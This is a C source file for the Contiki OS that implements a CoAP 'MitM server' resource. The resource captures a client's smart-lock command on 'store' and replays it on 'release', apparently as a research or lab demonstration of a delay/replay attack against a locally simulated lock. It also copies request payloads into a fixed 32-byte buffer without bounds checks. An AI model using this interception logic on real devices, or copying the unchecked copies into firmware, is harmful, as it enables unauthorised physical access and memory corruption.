/*
 * Copyright (c) 2013, Institute for Pervasive Computing, ETH Zurich
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the Institute nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE INSTITUTE AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE INSTITUTE OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * This file is part of the Contiki operating system.
 */

/**
 * \file
 *      Example resource
 * \author
 *      Matthias Kovatsch <kovatsch@inf.ethz.ch>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "contiki.h"
#include "contiki-net.h"
#include "coap-engine.h"
#include "coap-blocking-api.h"


#include "coap-log.h"
#define LOG_MODULE "App"
#define LOG_LEVEL  LOG_LEVEL_APP



static uint8_t buffer[128];
static bool lock_is_open = false;
static void very_local_server(coap_message_t *request, coap_message_t *response)
{
  const uint8_t *u_payload;
  coap_get_payload(request, &u_payload);
  const char *payload = (char*)u_payload;
  int length = 0;
  if (!strcmp(payload, "open"))
  {
    if (lock_is_open)
    {
      length = 17;
      memcpy(buffer, "Lock already open", length);
    }
    else
    {
      length = 16;
      memcpy(buffer, "Lock is now open", length);
      lock_is_open = true;
    }
  }
  else if (!strcmp(payload, "close"))
  {
    if (lock_is_open)
    {
      length = 18;
      memcpy(buffer, "Lock is now closed", length);
      lock_is_open = false;
    }
    else
    {
      length = 19;
      memcpy(buffer, "Lock already closed", length);
    }
  }
  else
  {
    length = 15;
    LOG_INFO("Got invalid option \"%s\"\n", payload);
    memcpy(buffer, "Invalid request", length);
  }

  coap_set_header_content_format(response, TEXT_PLAIN);
  coap_set_header_etag(response, (uint8_t *)&length, 1);
  coap_set_payload(response, buffer, length);
}



static void res_get_handler(coap_message_t *request, coap_message_t *response, uint8_t *buffer, uint16_t preferred_size, int32_t *offset);
static void res_post_handler(coap_message_t *request, coap_message_t *response, uint8_t *buffer, uint16_t preferred_size, int32_t *offset);

/*
 * A handler function named [resource name]_handler must be implemented for each RESOURCE.
 * A buffer for the response payload is provided through the buffer pointer. Simple resources can ignore
 * preferred_size and offset, but must respect the REST_MAX_CHUNK_SIZE limit for the buffer.
 * If a smaller block size is requested for CoAP, the REST framework automatically splits the data.
 */
RESOURCE(res_mitm,
         "title=\"MitM server: ?len=0..\";rt=\"Text\"",
         res_get_handler,
         res_post_handler,
         NULL,
         NULL);

#define SERVER_EP "coap://[fd00::1]"      // Real server address
static coap_endpoint_t server_ep;

static const uint8_t *stored_payload;
static int stored_length;

typedef struct
{
  bool is_stored;                     // If true, the request is the one previously stored
  coap_message_t *response;           // Response to be sent to benign client
  uint8_t *buffer;                    // Buffer to write the response
  uint8_t initial_request_data[32];   // Initial request made by benign client
  int initial_request_length;         // Length of initial_request_data
} response_data_t;
static response_data_t stored_request;

PROCESS(send_request, "TBA");

void
response_handler2(coap_message_t *response)
{
  puts("Returned");
  stored_length = coap_get_payload(response, &stored_payload);
  printf("%d %s\n", stored_length, stored_payload);
}

PROCESS_THREAD(send_request, ev, data)
{
  PROCESS_BEGIN();
  puts("Processing request");
  
  response_data_t *parsed_data = (response_data_t*)data;
  
  static coap_message_t request[1];
  coap_init_message(request, COAP_TYPE_CON, COAP_POST, 0);
  coap_set_header_uri_path(request, "test");
  
  //const uint8_t *msg = calloc(128, sizeof(uint8_t));
  
  printf("Message: %s\n", parsed_data->initial_request_data);
  coap_set_payload(request, parsed_data->initial_request_data, parsed_data->initial_request_length);
  coap_message_t response[1];
  very_local_server(request, response);
  response_handler2(response);
  
  puts("Finished sending");
  
  memcpy(parsed_data->buffer, stored_payload, stored_length);
  coap_set_header_etag(parsed_data->response, (uint8_t *)&stored_length, 1);
  coap_set_payload(parsed_data->response, parsed_data->buffer, stored_length);
  
  puts("Finished processing request");
  
  PROCESS_END();
}

extern struct process send_request_core, send_request_main;

static bool store_next = false;

static void
res_get_handler(coap_message_t *request, coap_message_t *response, uint8_t *buffer, uint16_t preferred_size, int32_t *offset)
{
  const uint8_t *u_payload;
  coap_get_payload(request, &u_payload);
  const char *payload = (char*)u_payload;
  int length = 0;
  if (!strcmp(payload, "store"))
  {
    puts("Storing a request");
    length = 17;
    memcpy(buffer, "Storing activated", length);
    store_next = true;
  }
  else if (!strcmp(payload, "release"))
  {
    printf("Releasing stored request %s\n", stored_request.initial_request_data);
    
    stored_request.response = response;
    stored_request.buffer = buffer;
    process_start(&send_request, &stored_request);
    while (process_is_running(&send_request)) {};
    return;
  }
  else
  {
    length = 15;
    LOG_INFO("Got invalid option \"%s\"\n", payload);
    memcpy(buffer, "Invalid request", length);
  }

  coap_set_header_content_format(response, TEXT_PLAIN);
  coap_set_header_etag(response, (uint8_t *)&length, 1);
  coap_set_payload(response, buffer, length);
  puts("Processed attack request");
}

static void
res_post_handler(coap_message_t *request, coap_message_t *response, uint8_t *buffer, uint16_t preferred_size, int32_t *offset)
{
  //for (int i = 0; i < 1000000000L; ++i) {}
  //printf("Process: %p\n", send_request_core);
  //process_poll(&send_request_core);
  coap_endpoint_parse(SERVER_EP, strlen(SERVER_EP), &server_ep);
  
  if (store_next)
  {
    stored_request.is_stored = true;
    uint8_t *msg;
    stored_request.initial_request_length = coap_get_payload(request, (const uint8_t**)&msg);
    msg[stored_request.initial_request_length] = '\0';
    memcpy(stored_request.initial_request_data, msg, stored_request.initial_request_length + 1);
    //memcpy(stored_request.initial_request, request, sizeof(*request));
    store_next = false;
    puts("Stored request, no sending");
  }
  else
  {
    response_data_t response_data;
    response_data.is_stored = false;
    response_data.response = response;
    response_data.buffer = buffer;
    uint8_t *msg;
    response_data.initial_request_length = coap_get_payload(request, (const uint8_t**)&msg);
    msg[response_data.initial_request_length] = '\0';
    printf("Request %s of length %d\n", msg, response_data.initial_request_length);
    memcpy(response_data.initial_request_data, msg, response_data.initial_request_length + 1);
    process_start(&send_request, &response_data);
    while (process_is_running(&send_request)) {};
    puts("Got request, resending");
  }
  
}
